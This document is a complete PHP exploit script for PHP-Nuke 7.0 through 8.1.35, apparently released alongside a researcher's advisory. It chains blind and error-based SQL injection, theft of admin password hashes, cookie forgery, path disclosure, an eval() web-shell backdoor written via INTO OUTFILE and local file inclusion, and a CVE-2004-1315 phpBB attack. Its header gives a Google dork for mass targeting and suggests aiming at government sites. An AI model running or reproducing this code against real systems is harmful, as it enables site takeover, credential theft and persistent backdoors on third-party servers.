#!/usr/bin/php
<?php
/*******************************************************************************
Wormable Remote Code Execution in PHP-Nuke 7.0/8.1/8.1.35(newist as of release)
Vendor's Website:http://phpnuke.org/
Secuirty Researcher: Michael Brooks (https://sitewat.ch)
Original Advisory: http://blog.sitewat.ch/2010/05/vulnerabilities-in-php-nuke.html

Google hack:
"Francisco Burzi"  "Page Generation:"  Seconds inurl:modules.php
1,170,000 results
add inurl:gov to the google hack if you want to make the news ;)
Works with maigic_quotes_gpc=On or Off
Works with AppArmor and Suhosin Hadend-PHP, tested on Ubuntu 9.04 and 10.04
My own LFI+SQLI attack is used to bypass AppArmor!
Also tested XAMPP on Windows XP
All tests where done with MySQL5 and PHP5
To obtain a user's cookie:
1) Register a normal account
2) Login
3) Type this into the same address bar and hit enter: javascript:document.cookie
To set a cookie you can do use this: javascript:document.cookie="admin=MjphZG1pbjoyMTIzMmYyOTdhNTdhNWE3NDM4OTRhMGU0YTgwMWZjMzoxMDo6MDowOjA6MDpEZWVwQmx1ZTo0MDk2"
*******************************************************************************/
set_time_limit(0);
//The blind_sql_injeciton calss is a general exploit framework that we are inheriting.
class php_nuke_blind_sql_injection extends blind_sql_injection {
    //This is the blind sql injection request.
    function query($check){
        //Rate limiter to bypass ipban.php's protection.
        //Must stay below 5 requests every 2 seconds.
        if(!($this->request_count%4)){
            sleep(2);
        }
        //build the http request to Inject a query:
        //This is a simple get request with a custom referer
	     //$this->set_referer("'="/\*"  (select ".$check." from nuke_authors limit 1))-- */");
        $this->set_referer("'=(select ".$check." from nuke_authors limit 1))-- 1");
        /*example get and post request.
        *$this->set_get("id=1 or (select ".$check." from nuke_authors limit 1))";//$_GET[id]
        *$this->set_post("id=1 or (select ".$check." from nuke_authors limit 1))");//$_POST[id]
        */
    }
}
//This is a very efficient blind sql injection class. 
class blind_sql_injection{
    var $url, $backup_url, $result, $http, $request_count, $timeout;
    function blind_sql_injection($url,$timeout=10){
        $this->request_count=0;
        $this->url=$url;
        $this->backup_url=$url;
        $this->http=new http_client();
        $this->timeout=$timeout;
    }
    function set_get($get){
        $this->url=$this->url."?".$get;
    }
    function set_referer($referer){
        $this->http->referer=$referer;
    }
    function set_post($post){
        $this->http->postdata=$post;
    }
    function test_target(){
        return $this->send("if(true,sleep(".$this->timeout."),0)")&&!$this->send("if(false,sleep(".$this->timeout."),0)");
    }
    function num_to_hex($arr){
        $ret='';
        foreach($arr as $a){
            if($a<=9){
                $ret.=$a;
            }else{
                $ret.=chr(87+$a);
            }
        }
        return $ret;
    }
    //Looking for a string of length 32 and base 16 in ascii chars.
    function find_md5($column){
        return $this->num_to_hex($this->bin_finder(16,32,"conv(substring($column,%s,1),16,10)"));
    }
    function find_sha1($column){
        return $this->num_to_hex($this->bin_finder(16,40,"conv(substring($column,%s,1),16,10)"));
    }
    //Look for an ascii string of arbitrary length.
    function find_string($column){
        $ret='';
        //A length of zero means we are looking for a null byte terminated string.
        $result=$this->bin_finder(128,0,"ascii(substring($column,%s,1))");
        foreach($result as $r){
            $ret.=chr($r);
        }
        return $ret;
    }
    //query() is a method that generates the sql injection request
    function query($check){
        //This function must be overridden.
    }
    function recheck($result,$question,$base){
       $this->bin_finder($base,1,$question,$start);
       //Force a long timeout.
       $tmp_timeout=$this->timeout;
       if($this->timeout<10){
          $this->timeout=10;
       }else{
          $this->timeout=$this->timeout*2;
       }
       $l=1;
       foreach($result as $r){
          if($this->send("if(".sprintf($question,$l)."!=".$r.",sleep(".$this->timeout."),0)")){
              $result[]=$b;
              break;
          }
          $l++;
       }
       $this->timeout=$tmp_timeout;
    }
    function linear_finder($base,$length,$question){
        for($l=1;$l<=$length;$l++){
            for($b=0;$b<$base;$b++){
                if($this->send("if(".sprintf($question,$l)."=".$b.",sleep(".$this->timeout."),0)")){
                    $result[]=$b;
                    break;
                }
            }
        }
    }
    #Binary search for mysql based sql injection.
    function bin_finder($base,$length,$question){
         $start_pos=1;
        $result='';
        for($cur=$start_pos;$cur<=$length||$length==0;$cur++){
            $n=$base-1;
            $low=0;
            $floor=$low;
            $high=$n-1;
            $pos= $low+(($high-$low)/2);
            $found=false;
            while($low<=$high&&!$found){
                #asking the sql database if the current value is greater than $pos
                if($this->send("if(greatest(".sprintf($question,$cur).",".$pos.")!=".$pos.",sleep(".$this->timeout."),0)")){
                    #if this is true then the value must be the modulus.
                    if($pos==$n-1){
                       $result[]=$pos+1;
                       $found=true;
                    }else{
                        $low=$pos+1;
                    }
                #asking the sql database if the current value is less than $pos
                }else if($this->send("if(least(".sprintf($question,$cur).",".$pos.")!=".$pos.",sleep(".$this->timeout."),0)")){
                   #if this is true the value must be zero, or in the case of ascii,  a null byte.
                   if($pos==$floor+1){
                        $found=true;
                        #We have found the null terminator so we have finnished our search for a string.
                        if($length==0){
                            $length=-1;
                        }else{
                            $result[]=$pos-1;
                        }
                    }else{
                        $high=$pos-1;
                    }
                }else{
                    #both greater than and less then where asked, so so then the answer is our guess $pos.
                    $result[]=$pos;
                    $found=true;
                }
                $pos=$low+(($high-$low)/2);
            }
            print(".");
        }
        return $result;
    }
    //Fire off the request
    function send($quesiton){
        //build the injected query.
        $this->query($quesiton);
        $start=time();
        $resp=$this->http->send($this->url);
        //backup_url is for set_get()
        $this->url=$this->backup_url;
        $this->request_count++;
        return (time()-$start>=$this->timeout);
    }
    //retroGod RIP
    function charEncode($string){
        $char="char(";
        $size=strlen($string);
        for($x=0;$x<$size;$x++){
            $char.=ord($string[$x]).",";
        }
        $char[strlen($char)-1]=")%00";
        return $char;
    }
}
//General purpose http client that works on a default php install. 
class http_client{
    var $proxy_ip='', $proxy_port='', $proxy_name='', $proxy_pass='', $referer='',$cookie='',$postdata='';
    function send($loc){
         //overload function polymorphism between gets and posts
         $url=parse_url($loc);
         if(!isset($url['port'])){
            $url['port']=80;
        }
         $ua='Firefox';
         if($this->proxy_ip!=''&&$this->proxy_port!=''){
            $fp = pfsockopen( $this->proxy_ip, $this->proxy_port, &$errno, &$errstr, 120 );
            $url['path']=$url['host'].':'.$url['port'].$url['path'];
         }else{
            $fp = fsockopen( $url['host'], $url['port'], &$errno, &$errstr, 120 );
         }
         if( !$fp ) {
            print "$errstr ($errno)<br>\nn";
            return false;
         } else {
            if( $this->postdata=='' ) {
                $request="GET ".$url['path']."?".$url['query']." HTTP/1.1\r\n";
            } else {
                $request="POST ".$url['path']."?".$url['query']." HTTP/1.1\r\n";
            }
            if($this->proxy_name!=''&&$this->proxy_pass!=''){
                $request.="Proxy-Authorization: Basic ".base64_encode($this->proxy_name.":".$this->proxy_pass)."\r\n\r\n";
            }
            $request.="Host: ".$url['host'].":".$url['port']."\r\n";
            $request.="User-Agent: ".$ua."\r\n";
            $request.="Accept: text/plain\r\n";
            if($this->referer!=''){
                $request.="Referer: ".$this->referer."\r\n";
            }
            $request.="Connection: Close\r\n";
            if($this->cookie!=''){
                $request.="Cookie: ".$this->cookie."\r\n" ;
            }
            if( $this->postdata!='' ) {
                $strlength = strlen( $this->postdata );
                $request.="Content-type: application/x-www-form-urlencoded\r\n" ;
                $request.="Content-length: ".$strlength."\r\n\r\n";
                $request.=$this->postdata;
            }
            fputs( $fp, $request."\r\n\r\n" );
               while( !feof( $fp ) ) {
                   $output .= fgets( $fp, 1024 );
               }
            fclose( $fp );
            //php_nuke only:
            if(strstr($output,"too many page loads")){
                print "REQUEST CAP HIT!\n";
                print_r(debug_backtrace());
                print "REQUEST CAP HIT!\n";
                die();
            }
            return $output;
         }
    }
    //Use a http proxy
    function proxy($proxy){ //user:pass@ip:port
        $proxyAuth=explode('@',$proxy);
        if(isset($proxyAuth[1])){
            $login=explode(':',$proxyAuth[0]);
            $this->proxy_name=$login[0];
            $this->proxy_pass=$login[1];
            $addr=explode(':',$proxyAuth[1]);
        }else{
            $addr=explode(':',$proxy);
        }
	     $this->proxy_ip=$addr[0];
        $this->proxy_port=$addr[1];
    }
    //Parses the results from a PHP error to use as a path disclosure.
    function getPath($url,$pops=1){
        $html=$this->send($url);
        //Regular error reporting:
        $resp=explode("array given in <b>",$html);
        if(isset($resp[1])){
            $resp = explode("</b>",$resp[1]);
        }else{
            //xdebug's error reporting:
            $resp=explode("array given in ",$html);
            if(isset($resp[1])){
                $resp = explode(" ",$resp[1]);
            }else{
                $resp[0]=false;
            }
        }
        $path=$resp[0];
        //Can't use dirname()
        if(strstr($path,"\\")){
           $p=explode("\\",$path);
           for($x=0;$x<$pops;$x++){
               array_pop($p);
           }
           $path=implode("\\",$p);
        }else{
           $p=explode("/",$path);
           for($x=0;$x<$pops;$x++){
               array_pop($p);
           }
           $path=implode("/",$p);
        }
        return $path;
    }
    //Grab the server type from the http header.
    function getServer($url){
        $resp=$this->send($url);
        $header=explode("Server: ",$resp);
        $server=explode("\n",$header[1]);
        return $server[0];
    }
}
function main(){
   $user_input=getopt("t:c:a:");
   if($user_input['t']){
      $attack_url=$user_input['t'];
      if($user_input['c']){
         $user_cookie=$user_input['c'];
      }
      //This is only useful for debugging,  so its not listed in the useage.
      if($user_input['a']){
         $admin_cookie=$user_input['a'];
      }
   }else{
      print("Useage: ./php_exploit -t http://localhost\n");
      die("A user's cookie is required for 8.1.35 : ./php_exploit -t http://localhost -c user=MjphZG1pbjo1ZjRkY2MzYjVhYTc2NWQ2MWQ4MzI3ZGViODgyY2Y5OToxMDo6MDowOjA6MDo6NDA5Ng==\n");
   }
   $attack_url=str_replace("index.php","",$attack_url);
   $http=new http_client();
   $sex=new php_nuke_blind_sql_injection($attack_url."/");
   if(!$admin_cookie){
	  //This is what a cookie looks like:
	  //2:user_name:21232f297a57a5a743894a0e4a801fc3:10::0:0:0:0:DeepBlue:4096
	  //$user_cookie="user=MjphZG1pbjoyMTIzMmYyOTdhNTdhNWE3NDM4OTRhMGU0YTgwMWZjMzoxMDo6MDowOjA6MDpEZWVwQmx1ZTo0MDk2";
	  if($user_cookie){
        print "Using cookie...\n";
        $http->cookie=$user_cookie;
        //1337+30000 is used as a pivot in parsing,  and to test for a sucessful injection.
        //This is NOT Blind SQL Injection,  we will be reading the result.  This attack works with magic_quotes_gpc on or off.
        $http->postdata="title=wow\\&bodytext=/*&mood=".urlencode("'*/,0,0,1337+30000,(select aid from nuke_authors limit 1),0,(select pwd from nuke_authors limit 1),1337+30000)-- 1")."&status=no&submit=Add+New+Entry";
        $response=$http->send($attack_url."/modules.php?name=Journal&file=savenew");
        //This part of the exploit is a bit strange sorry for the mess,  gotta realease!
        if(strstr($response,"javascript:history.go(-1)")){
            //magic_quotes_gpc=on
            $http->postdata="title=wow&jbodytext=text&mood=".urlencode("',1337+30000,(select aid from nuke_authors limit 1),0,(select pwd from nuke_authors limit 1),1337+30000)-- 1")."&status=no&submit=Add+New+Entry";
            $response=$http->send($attack_url."/modules.php?name=Journal&file=savenew");
            $http->postdata='';
            //Find the primary key of the journal entry we just created.
            $jid=$http->send($attack_url."/modules.php?name=Journal&file=edit");
            //we should have the single quote that we escaped at the end of wow'
            $jid=explode("\">wow<",$jid);
            $jid=explode("jid=", $jid[0]);
            //Check the journal for the admin's username/password hash
            $response=$http->send($attack_url."/modules.php?name=Journal&file=display&jid=".$jid[1]);
            if(strpos($response,"31337")){
               list($junk,$aid,$pwd)=explode("31337 @ ",$response);
               $aid=explode("<",$aid);
               $pwd=explode("<",$pwd);
               $user_name=$aid[0];
               $pass_hash=$pwd[0];
            }else{
               //magic_quotes_gpc=off
               sleep(3);
               $http->postdata="title=wow\\&jbodytext=/*&mood=1&status=".urlencode("no',(select aid from nuke_authors limit 1),(select pwd from nuke_authors limit 1))-- 1")."&submit=Add+New+Entry";
               $response=$http->send($attack_url."/modules.php?name=Journal&file=savenew");
               sleep(2);
               $jid=$http->send($attack_url."/modules.php?name=Journal&file=edit");
               $jid=explode("\">wow<",$jid);
               $jid=explode("jid=", $jid[0]);
               $jid=explode("\">",$jid[1]);
               //Check the journal for the admin's username/password hash
               $response=$http->send($attack_url."/modules.php?name=Journal&file=display&jid=".$jid[0]);
               $inj=explode("Last updated on ",$response);
               $inj=explode(" @ ",$inj[1]);
               $pass_hash=$inj[0];
               $inj=explode("<",$inj[1]);
               $user_name=$inj[0];
            }
        }else{
            $http->postdata='';
            //Find the primary key of the journal entry we just created.
            $jid=$http->send($attack_url."/modules.php?name=Journal&file=edit");
            //we should have the single quote that we escaped at the end of wow'
            $jid=explode("\">wow',<",$jid);
            $jid=explode("jid=", $jid[0]);
            //Check the journal for the admin's username/password hash
            $response=$http->send($attack_url."/modules.php?name=Journal&file=display&jid=".$jid[1]);
            if(!strpos($response,"31337")){
               die("target has patched!\n");
            }else{
               print "Target vulnerable to a privilege escalation attack!!!\n";
               list($junk,$aid,$pwd)=explode("31337 @ ",$response);
               $aid=explode("<",$aid);
               $pwd=explode("<",$pwd);
               $user_name=$aid[0];
               $pass_hash=$pwd[0];
            }
         }
	   }else{
         $sex->sleep="sleep(5)";
         print "Starting Attack Against:".$attack_url."/\n";
         print "Testing for blind sql injection...\n";
         if(!$sex->test_target()){
             print("Target might be running 8.1.35\n");
             print("Try the privilege esciation attack to upload the shell:");
             die("./php_exploit -t http://localhost -c user=MjphZG1pbjo1ZjRkY2MzYjVhYTc2NWQ2MWQ4MzI3ZGViODgyY2Y5OToxMDo6MDowOjA6MDo6NDA5Ng==\n");
         }
         print "Target is vulnerable to blind sql injection!!!\n";
         print "Please Standby For Attack...\n";
         $pass_hash=$sex->find_md5("pwd");
         $user_name=$sex->find_string("aid");
         print "attacked used:".$sex->request_count." requests.\n";
	    }
	    print "Found Admin's name:".$user_name."\n";
	    print "Found MD5 Password hash:".$pass_hash."\n";
	    $admin_cookie="admin=".base64_encode($user_name.":".$pass_hash.":").";";
    }
    print "Using Admin Session ID:\n".$admin_cookie."\n";
    $http->cookie=$admin_cookie;
    //ipban.php
    sleep(3);
    //This request will tell us what version of php-nuke it is.
    //If it is 8, Then the page gives us configuration information to perserve.
    $admin_options=$http->send($attack_url."/admin.php?op=general");
    if(!strstr($admin_options,"Content-Length: 0")){
        print "PHP-Nuke 8 detected.\n";
        $option_values=explode("value='",$admin_options);
        $x=0;
        array_shift($option_values);
        //Parsing out and storing configuration values to restore them after the hack. 
        foreach( $option_values as $value){
            $value=explode("'",$value);
            $values[]=urlencode($value[0]);
            if($x++==4)
                break;
        }
        //ipban.php
        sleep(2);
        //Enable error reporting
        $http->postdata="xsitename=".$values[0]."&xnukeurl=".$values[1]."&xslogan=".$values[2]."&xstartdate=".$values[3]."&xadmingraphic=".$values[4]."&xgfx_chk=0&xnuke_editor=1&xdisplay_errors=1&op=savegeneral";
        $error_reporting=$http->send($attack_url."/admin.php");
        //Path diclosure in add_pwd.  We will trigger a warning by passing md5() the array add_pwd[].
        $http->postdata="add_name=junk&add_aid=junk&add_email=junk&add_url=junk&add_admlanguage=&auth_modules%5B%5D=23&add_radminsuper=1&add_pwd[]=junk&op=AddAuthor";
        $remote_path=$http->getPath($attack_url."/admin.php",3);
        sleep(2);
        if(strstr($remote_path,':\\')){
            print "Windows box detected.\n";
            print "Remote path:$remote_path\n";
            print "Uploading backdoor...\n";
            $remote_path=addslashes(addslashes($remote_path."\\frontend.php"));
            $backdoor='get_magic_quotes_gpc()?eval(stripslashes($_GET["e"])):eval($_GET["e"])';
            //Could have used a concat but php-nuke filters for it.  This hides <> from the xss filter.
            //union/**/ bypasses the sql injection filter on line 414 in ./mainfile.php
            $http->postdata="chng_uid=".urlencode("' union/**/ select ".$sex->charEncode("<?php").",'".$backdoor."',".$sex->charEncode("?>").",'','','','','','','','','','','','','','','' into outfile '".$remote_path."'-- 1");
            $re=$http->send($attack_url."/admin.php?op=modifyUser");
            //Disable error reporting
            $http->postdata="xsitename=".$values[0]."&xnukeurl=".$values[1]."&xslogan=".$values[2]."&xstartdate=".$values[3]."&xadmingraphic=".$values[4]."&xgfx_chk=0&xnuke_editor=1&xdisplay_errors=0&op=savegeneral";
            $error_reporting=$http->send($attack_url."/admin.php");
        }else{
            print "*nix box detected.\n";
            print "Remote path:$remote_path\n";
            //Is mysql on the same machine as the httpd?
            sleep(2);
            $http->postdata="chng_uid=".urlencode("' or 1=(select if(substring(load_file('".$remote_path."/index.php'),1,1)='<',0,1))-- 1");
            $mysql_check=$http->send($attack_url."/admin.php?op=modifyUser");
            if(strstr($mysql_check,"User Doesn't Exists!")){
                print("MySQL isn't on the same machine or you do not have file privileges.\n");
                die("Remote code execution failed\n");
            }
            print "Uploading backdoor...\n";
            //ipban.php
            sleep(2);
            //Grab the theme,  this is needed to repair the database after the LFI
            $theme=$http->send($attack_url."/admin.php?op=themes");
            $theme=explode('src="themes/',$theme);
            $theme=explode('/images/',$theme[1]);
            //Repair the database after the LFI.
            $backdoor_installer='function OpenTable(){} function themeheader(){} $db->sql_query("update ".$prefix."_config set Default_Theme='.$sex->charEncode($theme[0]).', display_errors=0");';
            //This is a magic_quotes_gpc and mysql safe backdoor that fits on one line.
            $backdoor='get_magic_quotes_gpc()?eval(stripslashes(".chr(36)."_GET[".chr(34)."e".chr(34)."])):eval(".chr(36)."_GET[".chr(34)."e".chr(34)."])';
            //Install the backdoor in a relitive directory.
            $backdoor_installer.='file_put_contents($_SERVER["DOCUMENT_ROOT"].dirname($_SERVER["SCRIPT_NAME"])."/frontend.php",chr(60)."?php '.$backdoor.'?".chr(62));';
            //charEncode is used to bypass XSS filters.
	         //union/**/ bypasses the sql injection filter on line 414 in ./mainfile.php
            $http->postdata="chng_uid=".urlencode("' union/**/ select ".$sex->charEncode("<?php").",'".$backdoor_installer."',".$sex->charEncode("?>").",'','','','','','','','','','','','','','','' into outfile '/tmp/theme.php'-- 1");
            $http->send($attack_url."/admin.php?op=modifyUser");
            sleep(2);
            //local file include vulnerablity to execute /tmp/theme.php
            $http->postdata="xDefault_Theme=../../../../../../../../../../../tmp&xoverwrite_theme=0&op=savethemes";
            $http->send($attack_url."/admin.php");
            sleep(2);
            $http->postdata='';
            //Fire off a get request to trigger the uploaded php file using LFI
            $http->send($attack_url);
            sleep(2);
            //Try the LFI again, just in case.
            $http->send($attack_url."/admin.php");
        }
        sleep(2);
        //test if the backdoor works,  try and clean up after the exploit.
        $test_backdoor=$http->send($attack_url."/frontend.php?e=".urlencode("echo 31337;unlink('/tmp/theme.php');system('rm /tmp/theme.php');"));
        if(strstr($test_backdoor,"31337")){
            print "Remote Code execution tested successfully:\n".$attack_url."/frontend.php?e=phpinfo()".urlencode(';')."\n";
        }else{
            print "Backdoor install failed!\n";
        }
    }else{
        ////PHP-Nuke 7.0 Remote Code Execution Exploit using CVE-2004-1315 which affects the phpBB 2.0.6 module.
        print "PHP-Nuke 7 detected.\n";
        $http->postdata="";//send get requests.
        //Fire off a check for CVE-2004-1315,  phpbb maybe installed. 
        //This is more like the oringal CVE-2004-1315: %2527.printf(20041315).%2527
        //php-nuke was not vulnerable to this because of mainfile line 50: \([^>]*"?[^)]*\)
        //to byapss this check double urlencode the parren () %2527.printf%252820041315%2529.%2527
        $try_exploit=$http->send($attack_url."/modules.php?name=Forums&file=viewtopic&t=1&highlight=%2527.printf%252820041315%2529.%2527");
        //if the exploit didn't work,  then we might have to enable phpbb and populate it.
        if(!strstr($try_exploit,"20041315")){
            //Enalbe PHPBB
            $http->send($attack_url."/admin.php?op=module_status&mid=22&active=1");
            //create a new category for phpbb
            $http->postdata="mode=addcat&categoryname=test&addcategory=Create+new+category";
            $t=$http->send($attack_url."/modules/Forums/admin/admin_forums.php");
            //ipban.php
            sleep(2);
            //create a new form in the new category
            $http->postdata="forumname%5B1%5D=t&addforum%5B1%5D=Create+new+forum&categoryname=test";
            $t=$http->send($attack_url."/modules/Forums/admin/admin_forums.php?");
            $http->postdata="forumname=t&forumdesc=t&c=1&forumstatus=0&prune_days=7&prune_freq=1&mode=createforum&f=&submit=Create+new+forum";
            $http->send($attack_url."/modules/Forums/admin/admin_forums.php?");
            //create a new topic in the new form
            $http->postdata="username=t&subject=t&addbbcode18=%23444444&addbbcode20=12&helpbox=Insert+URL%3A+%5Burl%5Dhttp%3A%2F%2Furl%5B%2Furl%5D+or+%5Burl%3Dhttp%3A%2F%2Furl%5DURL+text%5B%2Furl%5D++%28alt%2Bw%29&message=test&mode=newtopic&f=1&post=Submit";
            $http->send($attack_url."/modules.php?name=Forums&file=posting");
            //ipban.php
            sleep(2);
            //access the first topic.
            $http->postdata="";
            //Check to see if any of the first 10 topics are exploitable.
            for($t=1;$t<10&&!strstr($try_exploit,"20041315");$t++){
                //Fire off a check for CVE-2004-1315.
               $try_exploit=$http->send($attack_url."/modules.php?name=Forums&file=viewtopic&t=".$t."&highlight=%2527.printf%252820041315%2529.%2527");
            }
        }
        //Check if we where able to hit CVE-2004-1315.
        if(strstr($try_exploit,"20041315")){
            print("Remote Code execution tested successfully:\n".$attack_url."/modules.php?name=Forums&file=viewtopic&t=".--$t."&highlight=%2527.phpinfo%2528%2529.%2527\nThis is a Doulbe urlencode()\n");
        }else{
            print("Remote code execution has failed!\n");
        }
    }
}
main();
?>

